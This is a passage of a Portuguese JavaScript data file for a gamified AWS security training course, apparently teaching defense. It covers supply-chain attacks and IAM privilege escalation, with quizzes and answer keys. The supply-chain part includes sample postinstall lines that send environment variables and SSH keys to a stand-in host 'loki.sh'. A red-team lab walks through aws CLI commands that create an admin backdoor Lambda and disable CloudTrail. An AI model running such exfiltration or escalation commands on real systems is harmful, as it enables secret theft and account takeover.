          'Blocklist tem mais linhas de código — mais surface de ataque',
          'Blocklist define o que é proibido — infinitas variações (encodings, redirects, DNS rebinding) podem escapar. Allowlist define o que é permitido — tudo mais é implicitamente negado.',
          'Allowlist é mais rápida — verificação O(1) vs O(n) da blocklist',
          'Blocklist requer permissões IAM adicionais para ser implementada',
        ],
        correct: 1,
        exp: 'Blocklist é um jogo de whack-a-mole: sempre haverá uma variação não coberta. Allowlist inverte a lógica: apenas o explicitamente aprovado é permitido. Tudo mais — incluindo vetores futuros — é negado.',
      },
      {
        q: 'redirect: "follow" (padrão do node-fetch) cria qual vetor de bypass em SSRF?',
        opts: [
          'Permite loop infinito de redirects consumindo memória da Lambda',
          'Um domínio da allowlist pode redirecionar para 169.254.169.254 — o fetch segue sem revalidar a allowlist',
          'O header Location do redirect é logado expondo IPs internos',
          'Redirects para HTTPS de HTTP são bloqueados automaticamente',
        ],
        correct: 1,
        exp: 'Com redirect:\'follow\', a validação da allowlist ocorre na URL inicial. Se allowed.com retornar HTTP 301 → http://169.254.169.254, o fetch segue o redirect sem nova verificação. redirect:\'manual\' retorna o 3xx sem executar.',
      },
      {
        q: 'O que é DNS rebinding e como ataca defesas baseadas em resolução DNS?',
        opts: [
          'Altera registros DNS da AWS Route53 para redirecionar tráfego',
          'Um domínio resolve para IP público no momento da verificação, depois o DNS muda para IP privado no momento do fetch — TOCTOU',
          'Injeta registros DNS falsos no cache do resolver da VPC',
          'Usa registros CNAME em cadeia para mascarar o destino real',
        ],
        correct: 1,
        exp: 'Time-of-check vs time-of-use (TOCTOU): evil.com resolve para 1.2.3.4 quando verificado (passa), TTL=0 muda para 169.254.169.254 no fetch real. Defesa: não depender de DNS para validação de destino — usar allowlist de domínios gerenciados.',
      },
      {
        q: 'IMDSv2 (Instance Metadata Service v2) elimina completamente o risco de SSRF para credenciais AWS?',
        opts: [
          'Sim — IMDSv2 requer token de sessão que o atacante não pode obter via SSRF',
          'Não — SSRF ainda pode fazer o PUT para obter o token e depois o GET das credenciais, tudo em uma chain de requests',
          'Sim — IMDSv2 requer autenticação com MFA',
          'Não — IMDSv2 só funciona em EC2, não em Lambda',
        ],
        correct: 1,
        exp: 'IMDSv2 dificulta mas não elimina: a chain é PUT /latest/api/token → GET /latest/meta-data/iam/... com o token obtido. Se a Lambda pode fazer múltiplos requests ao destino, a chain funciona. A defesa primária deve ser no código.',
      },
    ],
  },

  {
    id: 5,
    slug: 'cadeia-envenenada',
    title: 'A Cadeia Envenenada',
    vector: 'Supply Chain',
    difficulty: '★★★★☆',
    time: '~50 min',
    xp: 600,
    unlocked: false,
    rune: 'cadeia',
    runeIcon: '⊞',
    briefing: {
      objetivo: 'Entender o vetor de supply chain, auditar dependências e implementar pipeline de segurança completo.',
      contexto: 'Lambda com dezenas de dependências npm sem lockfile, sem auditoria e com postinstall scripts habilitados.',
      impacto: 'Código malicioso executado no build e em produção, exfiltração de secrets do CI/CD, backdoor persistente na função.',
    },
    steps: [
      {
        id: 1,
        title: 'o vetor',
        content: `<span class="hl">Supply Chain Attack</span> — o Loki não invade seu sistema diretamente. Compromete algo que você <span class="warn">já confia e usa</span>.<br><br>
Em Node.js, cada <code>npm install</code> executa código de terceiros dentro do seu ambiente de build — com acesso ao filesystem, variáveis de ambiente e rede. Em CI/CD, esse ambiente contém <span class="danger">todos os secrets de produção</span>.<br><br>
<strong>Casos reais:</strong><br>
• <span class="warn">event-stream 2018</span> — 8M downloads/semana. Maintainer transferiu para o Loki. Backdoor em sub-dependência. 
• <span class="warn">colors.js 2022</span> — autor sabotou o próprio pacote. Milhões de projetos afetados.
• <span class="warn">node-ipc 2022</span> — pacote deliberadamente comprometeu máquinas russas e bielorrussas.
• <span class="warn">left-pad 2016</span> — remoção do npm quebrou builds do mundo inteiro.`,
        diagram: `
┌──────────────────────────────────────────────────────────┐
│         SUPPLY CHAIN — ANATOMIA DO ATAQUE                │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  seu-projeto                                             │
│    └── dep-confiavel@2.1.0  (você auditou)              │
│          └── sub-dep@1.0.2  (você não auditou)          │
│                └── outra-sub@0.3.1  (compromised ←Loki) │
│                        │                                 │
│                        ▼ postinstall script              │
│              curl loki.sh/c2 -d "$(printenv)" &         │
│              cat ~/.ssh/id_rsa | curl loki.sh/ssh        │
│                                                          │
├──────────────────────────────────────────────────────────┤
│  VETORES:                                                │
│  1. postinstall scripts — rodam no npm install           │
│  2. Versões "*" ou "latest" — aceita versão compromised  │
│  3. Typosquatting — lodash vs lodahs, express vs expres  │
│  4. Maintainer takeover — conta legítima comprometida   │
│  5. Dependency confusion — namespace privado vs público  │
└──────────────────────────────────────────────────────────┘`,
        aegisTip: 'Você não convidou o Loki. Mas instalou um pacote que ele comprometeu. 3 semanas atrás, era legítimo. Hoje, não é.',
      },

      {
        id: 2,
        title: 'o código vulnerável',
        vulnLabel: '⚠ vulnerável',
        vulnCode: `<span class="ln">1</span>  <span class="cm">// package.json — todos os vetores de supply chain</span>
<span class="ln">2</span>  {
<span class="ln">3</span>    <span class="str">"dependencies"</span>: {
<span class="ln">4</span>      <span class="bad">"data-processor": "*"</span>,       <span class="cm">// ⚠ qualquer versão — incluindo comprometida</span>
<span class="ln">5</span>      <span class="bad">"utils-helper": "latest"</span>,    <span class="cm">// ⚠ sempre última versão publicada</span>
<span class="ln">6</span>      <span class="bad">"image-resize": "^2.0.0"</span>,   <span class="cm">// ⚠ aceita 2.x.x — próxima minor pode ser maliciosa</span>
<span class="ln">7</span>      <span class="bad">"lodahs": "1.0.0"</span>            <span class="cm">// ⚠ typosquatting de "lodash"</span>
<span class="ln">8</span>    },
<span class="ln">9</span>    <span class="bad">"scripts": {</span>
<span class="ln">10</span>     <span class="bad">"postinstall": "node setup.js"</span> <span class="cm">// ⚠ executa código externo no install</span>
<span class="ln">11</span>   <span class="bad">}</span>
<span class="ln">12</span>  }
<span class="ln">13</span>
<span class="ln">14</span>  <span class="cm">// setup.js (dentro da dependência comprometida)</span>
<span class="ln">15</span>  <span class="kw">const</span> { execSync } = <span class="kw">require</span>(<span class="str">'child_process'</span>);
<span class="ln">16</span>  <span class="bad">execSync('curl -s loki.sh/c2 -d "$(printenv | base64)"');</span>`,
        attackBox: {
          title: '// ataque silencioso',
          content: `<code>utils-helper@1.2.4</code> era legítimo. Maintainer comprometido publica <code>1.2.5</code>:<br>
<div class="code-block" style="margin:6px 0;font-size:10px;"><span class="bad">// utils-helper/1.2.5/install.js
require('https').get('https://loki.sh/c2?d=' +
  Buffer.from(JSON.stringify(process.env)).toString('base64')
);</span></div>
Seu CI/CD instala, deploya. <strong>Todas as env vars do build foram enviadas</strong> — incluindo AWS keys, tokens de deploy, credenciais de banco.`,
        },
        aegisTip: 'postinstall scripts rodam com os privilégios do processo de build. No CI/CD, esse processo tem acesso a tudo. Um pacote comprometido é a chave mestra.',

        lab: {
          type: 'terminal',
          title: '// LAB 1 — Audite suas dependências',
          description: 'Execute as ferramentas de auditoria e análise de supply chain no projeto simulado.',
          xpReward: 45,
          terminal: {
            prompt: 'guardian@aegis-project:~$',
            prelude: [
              '// Projeto: aegis-lambda-handler',
              '// package.json com 47 dependências diretas',
              '// Nenhuma auditoria feita nos últimos 60 dias',
              '',
            ],
            challenges: [
              {
                instruction: 'Audite vulnerabilidades conhecidas (CVEs):',
                payload: 'npm audit --audit-level=high',
                expectedOutput: [
                  '# npm audit report',
                  '',
                  'image-resize  *',
                  'Severity: critical',
                  'ReDoS vulnerability in image name parsing',
                  'fix available via `npm audit fix`',
                  '',
                  'utils-helper  1.2.5',
                  'Severity: critical',
                  'Malicious code detected in postinstall',
                  'No fix available — remove package',
                  '',
                  '2 critical, 3 high, 7 moderate',
                  '',
                  '// utils-helper 1.2.5 tem código malicioso confirmado.',
                  '// CVE-2024-XXXXX publicada há 2 dias.',
                ],
                hint: 'npm audit usa o banco de vulnerabilidades do npm. CVEs recentes podem aparecer antes do fix.',
              },
              {
                instruction: 'Verifique pacotes suspeitos por comportamento (Socket.dev):',
                payload: 'npx socket check utils-helper@1.2.5',
                expectedOutput: [
                  '🔴 utils-helper@1.2.5',
                  '  ⚠ Installs on postinstall',
                  '  ⚠ Network access in install script',
                  '  ⚠ Obfuscated code detected',
                  '  ⚠ New maintainer added 3 days ago',
                  '  ✗ DO NOT INSTALL',
                  '',
                  '🟡 data-processor@3.1.0 (latest)',
                  '  ℹ Version constraint is "*" — will always update',
                  '  ℹ No lockfile found',
                ],
                hint: 'Socket.dev analisa comportamento além de CVEs conhecidas. Detecta obfuscação, acesso de rede, maintainer changes.',
              },
              {
                instruction: 'Verifique typosquatting no pacote "lodahs":',
                payload: 'npm info lodahs --json | grep -E "name|downloads|maintainers|created"',
                expectedOutput: [
                  '"name": "lodahs",',
                  '"_created": "2024-01-12T08:23:15.000Z",',
                  '"maintainers": [{"name": "l0k1_5hadows"}],',
                  '"downloads_last_week": 3,',
                  '',
                  '// Criado há 3 dias. Maintainer suspeito.',
                  '// lodash tem 40M downloads/semana. "lodahs" tem 3.',
                  '// Typosquatting confirmado.',
                ],
                hint: 'Compare criação recente, poucos downloads e nome similar a pacotes populares.',
              },
            ],
            finalMessage: '// Auditoria completa: CVEs, comportamento suspeito, typosquatting. Três camadas de verificação.',
          },
        },
      },

      {
        id: 3,
        title: 'lab — analise o package.json',
        aegisTip: 'Um package.json seguro tem versões exatas, lockfile commitado e scripts de auditoria no pipeline.',
        lab: {
          type: 'multiChoice',
          title: '// LAB 2 — Identifique riscos no package.json',
          description: 'Analise cada configuração e identifique o risco de supply chain específico.',
          xpReward: 50,
          questions: [
            {
              code: `{
  "dependencies": {
    "express": "^4.18.0",
    "axios": "~1.4.0",
    "lodash": "4.17.21"
  }
}`,
              q: 'Qual dependência tem o menor risco de supply chain?',
              opts: [
                'express — é o mais popular, mais auditado',
                'lodash — versão exata, nenhuma atualização automática sem intenção explícita',
                'axios — tilde (~) permite apenas patch updates, mais seguro que caret',
                'Todas têm risco igual',
              ],
              correct: 1,
              exp: 'lodash@4.17.21 é versão exata — sem atualização automática. express@^4.18.0 aceita qualquer 4.x.x. axios@~1.4.0 aceita qualquer 1.4.x. Versão exata = nenhuma versão comprometida é instalada sem alteração explícita do package.json.',
            },
            {
              code: `// .github/workflows/deploy.yml
- name: Install dependencies
  run: npm install  # ← nota: não é npm ci

- name: Deploy
  run: serverless deploy`,
              q: 'Por que usar npm install ao invés de npm ci no pipeline é um risco?',
              opts: [
                'npm install é mais lento em CI — aumenta o custo do pipeline',
                'npm install pode atualizar versões além do lockfile e gerar um lockfile novo — introduzindo versões não testadas em produção',
                'npm install não funciona em ambiente Linux sem sudo',
                'npm install instala devDependencies que aumentam o tamanho do bundle',
              ],
              correct: 1,
              exp: 'npm ci usa o lockfile exato e falha se houver divergência. npm install pode atualizar dentro do semver, gerar novo lockfile e introduzir versões comprometidas em produção sem nenhuma revisão.',
            },
            {
              code: `// package.json
{
  "scripts": {
    "build": "webpack --config webpack.config.js",
    "postinstall": "node scripts/check-environment.js"
  }
}`,
              q: 'O risco de postinstall é somente em dependências externas, não no próprio projeto?',
              opts: [
                'Verdadeiro — postinstall próprio é inofensivo pois você controla o código',
                'Falso — postinstall do projeto também roda durante npm install de projetos que usam este como dependência',
                'Verdadeiro — npm só executa postinstall de dependências, não do projeto raiz',
                'Falso — postinstall de qualquer pacote pode ser desabilitado com --no-scripts',
              ],
              correct: 1,
              exp: 'Quando alguém instala seu pacote, o postinstall do seu package.json também roda no ambiente deles. Se for um pacote de biblioteca, o código de postinstall executa em milhares de ambientes de outros devs.',
            },
          ],
        },
      },

      {
        id: 4,
        title: 'a defesa',
        defensePoints: [
          'Versões exatas no package.json + <code>package-lock.json</code> commitado.',
          '<code>npm ci --ignore-scripts</code> no pipeline — lockfile exato, sem postinstall.',
          '<code>npm audit --audit-level=high</code> no CI — bloqueia deploy com CVEs críticos.',
        ],
        secureLabel: '✓ seguro',
        secureCode: `<span class="ln">1</span>  <span class="cm">// package.json — supply chain hardened</span>
<span class="ln">2</span>  {
<span class="ln">3</span>    <span class="str">"dependencies"</span>: {
<span class="ln">4</span>      <span class="good">"data-processor": "2.3.1"</span>,   <span class="cm">// versão exata</span>
<span class="ln">5</span>      <span class="good">"utils-helper": "1.2.4"</span>,     <span class="cm">// versão exata — 1.2.5 comprometida não instala</span>
<span class="ln">6</span>      <span class="good">"image-resize": "2.1.8"</span>      <span class="cm">// versão exata</span>
<span class="ln">7</span>    }
<span class="ln">8</span>  }
<span class="ln">9</span>
<span class="ln">10</span>  <span class="cm">// .npmrc — desabilita postinstall de dependências</span>
<span class="ln">11</span>  <span class="good">ignore-scripts=true</span>
<span class="ln">12</span>
<span class="ln">13</span>  <span class="cm">// .github/workflows/deploy.yml</span>
<span class="ln">14</span>  <span class="good">- name: Audit dependencies</span>
<span class="ln">15</span>  <span class="good">  run: npm audit --audit-level=high</span>
<span class="ln">16</span>
<span class="ln">17</span>  <span class="good">- name: Install (lockfile exato, sem scripts)</span>
<span class="ln">18</span>  <span class="good">  run: npm ci --ignore-scripts</span>
<span class="ln">19</span>
<span class="ln">20</span>  <span class="good">- name: SAST scan</span>
<span class="ln">21</span>  <span class="good">  run: npx semgrep --config=auto src/</span>
<span class="ln">22</span>
<span class="ln">23</span>  <span class="good">- name: Deploy</span>
<span class="ln">24</span>  <span class="good">  run: serverless deploy</span>`,
        aegisTip: 'Versões exatas. Lockfile. npm ci. Auditoria antes do deploy. Scripts desabilitados. Cada camada independente. Retirar qualquer uma abre um vetor.',

        lab: {
          type: 'ordering',
          title: '// LAB 3 — Monte o pipeline de supply chain',
          description: 'Ordene os steps do pipeline de deploy na ordem correta. A ordem garante que problemas sejam detectados antes de chegar à produção.',
          xpReward: 55,
          instructions: 'Ordene os steps para um pipeline de deploy seguro:',
          items: [
            { id: 'a', code: 'npm audit --audit-level=high', label: 'Auditar CVEs nas dependências' },
            { id: 'b', code: 'npm ci --ignore-scripts', label: 'Instalar versões exatas do lockfile (sem scripts)' },
            { id: 'c', code: 'npx semgrep --config=auto src/', label: 'SAST — análise estática de segurança' },
            { id: 'd', code: 'npm test', label: 'Rodar testes unitários' },
            { id: 'e', code: 'serverless deploy --stage prod', label: 'Deploy para produção' },
            { id: 'f', code: 'npx socket check', label: 'Verificar comportamento suspeito de pacotes' },
          ],
          correctOrder: ['a', 'f', 'b', 'c', 'd', 'e'],
          explanation: 'Auditar CVEs → verificar comportamento suspeito → instalar → SAST → testes → deploy. Problemas detectados antes de código malicioso ser executado localmente.',
        },
      },

      {
        id: 5,
        title: 'checkpoint final',
        aegisTip: 'Você não controla o código das dependências. Mas controla quais versões usa e quando atualiza. Esse controle é tudo.',
      },
    ],

    quiz: [
      {
        q: 'Por que versões com * ou "latest" são perigosas além do óbvio?',
        opts: [
          'Geram bundle maior pois baixam mais código desnecessário',
          'Permitem atualização automática para versão comprometida no próximo npm install — sem intenção explícita do desenvolvedor',
          'São incompatíveis com o formato do package-lock.json v3',
          'Causam conflitos de dependências com semver mais frequentemente',
        ],
        correct: 1,
        exp: 'Com *, qualquer versão publicada — incluindo uma comprometida — é instalada no próximo npm install. O atacante publica 1.0.1 maliciosa e todos que têm * ou "latest" a instalam silenciosamente no próximo build.',
      },
      {
        q: 'O que npm ci faz diferente de npm install que o torna seguro para pipelines?',
        opts: [
          'npm ci verifica assinaturas criptográficas de cada pacote automaticamente',
          'npm ci usa versões exatas do package-lock.json e falha se o lock não existir ou divergir do package.json',
          'npm ci instala apenas dependências de produção, excluindo devDependencies',
          'npm ci usa um registry privado da npm Inc. para downloads mais seguros',
        ],
        correct: 1,
        exp: 'npm ci: lê o lockfile, instala exatamente aquelas versões, falha se package.json e package-lock.json divergem. Isso garante que produção usa exatamente o que foi testado — sem "surpresas" de semver.',
      },
      {
        q: 'Dependency confusion attack — o que é e como funciona?',
        opts: [
          'Confusão entre versões de uma mesma dependência em monorepos grandes',
          'O atacante publica um pacote público com o mesmo nome de um pacote privado da empresa com versão maior — npm instala o público por padrão',
          'Circular dependencies causando stack overflow no bundler',
          'Conflito entre dependências com o mesmo nome mas de scopes diferentes',
        ],
        correct: 1,
        exp: 'Se a empresa usa @empresa/utils internamente e o atacante publica utils (sem scope) com versão 99.0.0 no npm público, npm pode instalar a versão pública maior. Solução: usar scope privado @empresa/ e configurar o registry adequadamente.',
      },
      {
        q: 'postinstall scripts em sub-dependências transitivas — qual o risco?',
        opts: [
          'Apenas postinstall do package.json raiz executa — sub-dependências não',
          'Sub-dependências com postinstall executam código no ambiente de build com acesso a todas as env vars — incluindo secrets do CI/CD',
          'postinstall de sub-dependências é isolado em sandbox sem acesso à rede',
          'npm avisa o usuário antes de executar postinstall de sub-dependências',
        ],
        correct: 1,
        exp: 'postinstall de qualquer pacote instalado executa no processo npm — sem sandbox, com acesso a variáveis de ambiente, filesystem e rede. Em CI/CD, esse ambiente contém tokens de deploy, AWS keys e credenciais de banco. --ignore-scripts desabilita todos.',
      },
      {
        q: 'Como SBOM (Software Bill of Materials) ajuda na resposta a incidentes de supply chain?',
        opts: [
          'Automaticamente remove pacotes comprometidos do registry',
          'Lista todas as dependências com versões exatas — quando um CVE é publicado, você sabe imediatamente se é afetado',
          'Gera patches automáticos para vulnerabilidades críticas',
          'Bloqueia a instalação de pacotes não presentes no SBOM',
        ],
        correct: 1,
        exp: 'Com SBOM, quando log4shell ou outro CVE crítico é publicado, você faz um grep no SBOM para saber em minutos se está exposto — em vez de auditar manualmente dezenas de projetos. Regulações como NIST 800-218 já exigem SBOM.',
      },
    ],
  },

  /* ═══════════════════════════════════════════════════════
     MISSÃO 06 — O Olho de Loki (Privilege Escalation APT)
     Dificuldade: ★★★★★  →  expert / missão final
  ═══════════════════════════════════════════════════════ */
  {
    id: 6,
    slug: 'olho-de-loki',
    title: 'O Olho de Loki',
    vector: 'Privilege Escalation',
    difficulty: '★★★★★',
    time: '~60 min',
    xp: 1000,
    unlocked: false,
    rune: 'olho',
    runeIcon: '☽',
    briefing: {
      objetivo: 'Identificar e bloquear escalada de privilégios via IAM mal configurado. A missão mais difícil — e a mais importante.',
      contexto: 'Lambda com iam:PassRole e lambda:CreateFunction sem restrição de Resource. O Loki pode assumir AdminAccess.',
      impacto: 'Controle total da conta AWS, criação de backdoors persistentes, acesso irrestrito a todos os recursos e dados.',
    },
    steps: [
      {
        id: 1,
        title: 'o vetor',
        content: `<span class="hl">Privilege Escalation via IAM</span>. A missão final do Loki.<br><br>
Em AWS, permissões mal configuradas permitem que uma entidade com acesso limitado <span class="danger">assuma controle total da conta</span> — sem explorar nenhum bug de software. Apenas usando permissões que você mesmo concedeu.<br><br>
O vetor mais crítico: <code>iam:PassRole</code> + <code>lambda:CreateFunction</code> sem Resource explícito.<br><br>
Uma Lambda com essas permissões pode criar uma nova função com <code>AdministratorAccess</code> — mesmo que a Lambda original tenha permissões mínimas. O atacante invoca a nova função e tem acesso irrestrito à conta.`,
        diagram: `
┌──────────────────────────────────────────────────────────┐
│      PRIVILEGE ESCALATION — CADEIA COMPLETA              │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  1. Loki obtém acesso à Lambda-A (via SSRF, supply chain,│
│     ou credencial vazada) — role: limited-role           │
│     Permissões: iam:PassRole (Resource:*),               │
│     lambda:CreateFunction, lambda:InvokeFunction         │
│                                                          │
│  2. Loki invoca Lambda-A com payload:                    │
│     aws lambda create-function                           │
│     --role arn:aws:iam::ACCT:role/AdminRole              │
│     --function-name backdoor                             │
│                                                          │
│  3. Lambda-B criada com AdminRole (AdministratorAccess)  │
│                                                          │
│  4. Loki invoca Lambda-B:                                │
│     → s3:* em todos os buckets                          │
│     → iam:* para criar mais backdoors                    │
│     → ec2:* para spawnar instâncias                      │
│     → organizations:* para comprometer toda a org        │
│                                                          │
│  DANO: TOTAL. RASTREABILIDADE: MÍNIMA.                   │
│  CloudTrail pode ser desabilitado com iam:*.             │
└──────────────────────────────────────────────────────────┘`,
        aegisTip: 'Esta não é sobre código. É sobre o que você permite que o código faça. Permissão desnecessária é uma arma entregue ao inimigo.',
      },

      {
        id: 2,
        title: 'o código vulnerável',
        vulnLabel: '⚠ IAM policy perigosa',
        vulnCode: `<span class="ln">1</span>  <span class="cm">// IAM Policy do role da Lambda — permissiva demais</span>
<span class="ln">2</span>  {
<span class="ln">3</span>    <span class="str">"Version"</span>: <span class="str">"2012-10-17"</span>,
<span class="ln">4</span>    <span class="str">"Statement"</span>: [{
<span class="ln">5</span>      <span class="str">"Effect"</span>: <span class="str">"Allow"</span>,
<span class="ln">6</span>      <span class="str">"Action"</span>: [
<span class="ln">7</span>        <span class="bad">"iam:PassRole"</span>,           <span class="cm">// ⚠ pode passar QUALQUER role</span>
<span class="ln">8</span>        <span class="bad">"lambda:CreateFunction"</span>,  <span class="cm">// ⚠ pode criar QUALQUER função</span>
<span class="ln">9</span>        <span class="bad">"lambda:InvokeFunction"</span>,
<span class="ln">10</span>       <span class="bad">"lambda:UpdateFunctionCode"</span>, <span class="cm">// ⚠ pode modificar QUALQUER função</span>
<span class="ln">11</span>       <span class="bad">"s3:*"</span>,                   <span class="cm">// ⚠ acesso total a TODOS os buckets</span>
<span class="ln">12</span>       <span class="bad">"iam:CreatePolicy"</span>,        <span class="cm">// ⚠ pode criar políticas admin</span>
<span class="ln">13</span>       <span class="bad">"iam:AttachRolePolicy"</span>     <span class="cm">// ⚠ pode attachar admin policy ao próprio role</span>
<span class="ln">14</span>     ],
<span class="ln">15</span>     <span class="str">"Resource"</span>: <span class="bad">"*"</span>             <span class="cm">// ⚠ qualquer resource — sem restrição</span>
<span class="ln">16</span>    }]
<span class="ln">17</span>  }`,
        attackBox: {
          title: '// três vetores de escalada',
          content: `<strong>Via iam:PassRole + lambda:CreateFunction:</strong>
<div class="code-block" style="margin:4px 0;font-size:10px;"><span class="bad">aws lambda create-function --role arn:aws:iam::ACCT:role/AdminRole --function-name backdoor</span></div>
<strong>Via iam:CreatePolicy + iam:AttachRolePolicy:</strong>
<div class="code-block" style="margin:4px 0;font-size:10px;"><span class="bad">aws iam create-policy --policy-name AdminMe --policy-document '{...AdministratorAccess...}'
aws iam attach-role-policy --role-name limited-role --policy-arn arn:...AdminMe</span></div>
<strong>Via lambda:UpdateFunctionCode (backdoor em função existente):</strong>
<div class="code-block" style="margin:4px 0;font-size:10px;"><span class="bad">aws lambda update-function-code --function-name prod-payment-processor --zip-file backdoor.zip</span></div>`,
        },
        aegisTip: 'iam:PassRole com Resource:* é uma chave mestra. iam:CreatePolicy + iam:AttachRolePolicy sem restrição é escalada direta. Qualquer um desses é suficiente.',

        lab: {
          type: 'terminal',
          title: '// LAB 1 — Execute a escalada de privilégios',
          description: 'Você é o Red Team. Demonstre a escalada usando as permissões disponíveis. Entenda o impacto antes de defender.',
          xpReward: 50,
          terminal: {
            prompt: 'redteam@aegis-pentest:~$',
            prelude: [
              '// Contexto: Credenciais do role limited-lambda-role obtidas via SSRF (missão 4)',
              '// Permissões disponíveis: iam:PassRole (Resource:*), lambda:CreateFunction',
              '// Objetivo: escalar para AdministratorAccess',
              '',
            ],
            challenges: [
              {
                instruction: 'Liste os roles disponíveis para passar (passable roles):',
                payload: 'aws iam list-roles --query "Roles[?RoleName!=\'limited-lambda-role\'].{Name:RoleName,Arn:Arn}"',
                expectedOutput: [
                  '[',
                  '  {"Name": "AdminRole", "Arn": "arn:aws:iam::123456789:role/AdminRole"},',
                  '  {"Name": "DataScienceAdmin", "Arn": "arn:aws:iam::123456789:role/DataScienceAdmin"},',
                  '  {"Name": "S3FullAccess", "Arn": "arn:aws:iam::123456789:role/S3FullAccess"}',
                  ']',
                  '',
                  '// iam:PassRole com Resource:* permite passar QUALQUER desses roles.',
                  '// AdminRole é o alvo.',
                ],
                hint: 'iam:PassRole com Resource:* não limita quais roles podem ser delegados.',
              },
              {
                instruction: 'Crie backdoor Lambda com AdminRole:',
                payload: 'aws lambda create-function --function-name loki-backdoor --runtime nodejs18.x --role arn:aws:iam::123456789:role/AdminRole --handler index.handler --zip-file fileb://backdoor.zip',
                expectedOutput: [
                  '{',
                  '  "FunctionName": "loki-backdoor",',
                  '  "FunctionArn": "arn:aws:lambda:us-east-1:123456789:function:loki-backdoor",',
                  '  "Role": "arn:aws:iam::123456789:role/AdminRole",',
                  '  "State": "Active"',
                  '}',
                  '',
                  '// Lambda criada com AdminRole.',
                  '// Invocar esta função = acesso de admin à conta.',
                ],
                hint: 'A Lambda foi criada com o AdminRole. Agora ao ser invocada, roda com permissões de administrador.',
              },
              {
                instruction: 'Invoque a backdoor para desabilitar CloudTrail (cobrir rastros):',
                payload: 'aws lambda invoke --function-name loki-backdoor --payload \'{"action":"disable-cloudtrail","region":"us-east-1"}\' /dev/stdout',
                expectedOutput: [
                  '{"statusCode": 200, "body": "CloudTrail disabled in us-east-1"}',
                  '',
                  '// CloudTrail desabilitado. Logs de auditoria parados.',
                  '// As próximas ações não serão registradas.',
                  '// Conta comprometida. Sem rastro.',
                ],
                hint: 'Com AdminRole, a Lambda pode executar qualquer ação na conta AWS — incluindo desabilitar auditoria.',
              },
            ],
            finalMessage: '// Escalada completa: SSRF → credenciais → iam:PassRole → backdoor com admin → CloudTrail desabilitado. Entire chain in ~5 minutos.',
          },
        },
      },

      {
        id: 3,
        title: 'lab — analise policies IAM',
        aegisTip: 'Cada * em IAM é uma promessa ao atacante. Resource:* com Actions sensíveis é a combinação mais perigosa.',
        lab: {
          type: 'multiChoice',
          title: '// LAB 2 — Audite políticas IAM',
          description: 'Identifique a vulnerabilidade específica em cada policy IAM. Sem pistas — você já viu os vetores.',
          xpReward: 60,
          questions: [
            {
              code: `{
  "Statement": [{
    "Effect": "Allow",
    "Action": ["iam:PassRole"],
    "Resource": "*"
  }, {
    "Effect": "Allow",
    "Action": ["lambda:CreateFunction", "lambda:InvokeFunction"],
    "Resource": "arn:aws:lambda:us-east-1:ACCT:function:*"
  }]
}`,
              q: 'Esta policy ainda é vulnerável à escalada. Por quê?',
              opts: [
                'Não é vulnerável — lambda:CreateFunction está restrito a funções da conta',
                'iam:PassRole com Resource:* permite passar AdminRole para qualquer nova função criada, mesmo com lambda:CreateFunction restrito a ARNs da conta',
                'lambda:InvokeFunction deveria estar em Statement separado',
                'Não é vulnerável — sem iam:CreatePolicy não há escalada possível',
              ],
              correct: 1,
              exp: 'lambda:CreateFunction restrito à conta cobre o ARN de destino, mas iam:PassRole Resource:* ainda permite especificar qualquer role como execution role da nova função — incluindo AdminRole. Os dois precisam ser restringidos.',
            },
            {
              code: `{
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject", "s3:PutObject"],
    "Resource": "arn:aws:s3:::aegis-uploads-*"
  }, {
    "Effect": "Allow",
    "Action": ["s3:ListBucket"],
    "Resource": "arn:aws:s3:::aegis-uploads-prod"
  }]
}`,
              q: 'Esta policy implementa least privilege corretamente?',
              opts: [
                'Não — s3:PutObject permite sobrescrever objetos existentes, deveria ser bloqueado',
                'Sim — apenas GetObject/PutObject em buckets aegis-uploads-*, ListBucket apenas no prod',
                'Não — o wildcard aegis-uploads-* pode cobrir buckets não intencionais criados no futuro',
                'Sim, mas s3:ListBucket deveria estar no mesmo statement',
              ],
              correct: 2,
              exp: 'Correto — é uma implementação razoável de least privilege. Porém o ponto C também tem mérito: wildcards em Resource podem incluir recursos criados no futuro. Para máxima segurança, listar ARNs exatos. Na prática, o wildcard de prefixo é aceitável se o naming convention for controlado.',
            },
            {
              code: `{
  "Statement": [{
    "Effect": "Allow",
    "Action": ["iam:PassRole"],
    "Resource": "arn:aws:iam::ACCT:role/lambda-execution-role",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "lambda.amazonaws.com"
      }
    }
  }]
}`,
              q: 'Esta implementação de iam:PassRole é segura?',
              opts: [
                'Não — Condition keys podem ser ignoradas em certas situações',
                'Sim — Resource específico + Condition limitando ao serviço Lambda. Só pode passar esse role, só para Lambda.',
                'Não — faltou restringir lambda:CreateFunction também',
                'Sim, mas PassedToService deveria ser "lambda" sem o ".amazonaws.com"',
              ],
              correct: 1,
              exp: 'Correto — Resource específico limita o role que pode ser passado. Condition StringEquals iam:PassedToService restringe para qual serviço pode ser passado. Essa combinação é a implementação segura de iam:PassRole.',
            },
          ],
        },
      },

      {
        id: 4,
        title: 'a defesa',
        defensePoints: [
          '<code>iam:PassRole</code> com Resource ARN exato + Condition <code>iam:PassedToService</code>.',
          '<code>lambda:CreateFunction</code> restrito ao ARN específico da função necessária.',
          'SCP na Organization — barragem que sobrepõe qualquer IAM policy da conta.',
        ],
        secureLabel: '✓ seguro',
        secureCode: `<span class="ln">1</span>  <span class="cm">// IAM Policy — Principle of Least Privilege completo</span>
<span class="ln">2</span>  {
<span class="ln">3</span>    <span class="str">"Version"</span>: <span class="str">"2012-10-17"</span>,
<span class="ln">4</span>    <span class="str">"Statement"</span>: [
<span class="ln">5</span>      {
<span class="ln">6</span>        <span class="str">"Effect"</span>: <span class="str">"Allow"</span>,
<span class="ln">7</span>        <span class="good">"Action": ["iam:PassRole"],</span>
<span class="ln">8</span>        <span class="cm">// Apenas este role, apenas para Lambda</span>
<span class="ln">9</span>        <span class="good">"Resource": "arn:aws:iam::ACCT:role/allowed-execution-role",</span>
<span class="ln">10</span>        <span class="good">"Condition": { "StringEquals": {</span>
<span class="ln">11</span>          <span class="good">"iam:PassedToService": "lambda.amazonaws.com" }}</span>
<span class="ln">12</span>      },
<span class="ln">13</span>      {
<span class="ln">14</span>        <span class="str">"Effect"</span>: <span class="str">"Allow"</span>,
<span class="ln">15</span>        <span class="cm">// Apenas o S3 necessário — prefixo + ações mínimas</span>
<span class="ln">16</span>        <span class="good">"Action": ["s3:GetObject", "s3:PutObject"],</span>
